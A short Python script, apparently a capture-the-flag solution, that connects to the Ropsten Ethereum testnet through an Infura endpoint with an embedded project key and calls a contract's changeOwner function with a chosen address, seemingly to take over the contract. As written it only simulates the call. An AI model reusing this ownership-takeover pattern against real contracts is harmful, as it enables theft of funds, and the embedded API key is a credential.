#!/usr/bin/env python3
# Flag -> 
from web3 import Web3
import json

EIP20_ABI = json.loads('[{"inputs":[{"internalType":"address","name":"newOwnerAddr","type":"address"}],"name":"changeOwner","outputs":[],"stateMutability":"view","type":"function"}]')
web3 = Web3(Web3.HTTPProvider('https://ropsten.infura.io/v3/cfa844c35873449480cfb3cba51a5555', request_kwargs={'timeout': 60}))
print(web3.isConnected())

address = '0xE1aA2600CF5E4770A0E33cDe66e6859f7f908107'
contract = web3.eth.contract(address="0x850C8db4739F66869757f09752811c4b692F02b8", abi=EIP20_ABI)
print(contract.functions.changeOwner(address).call())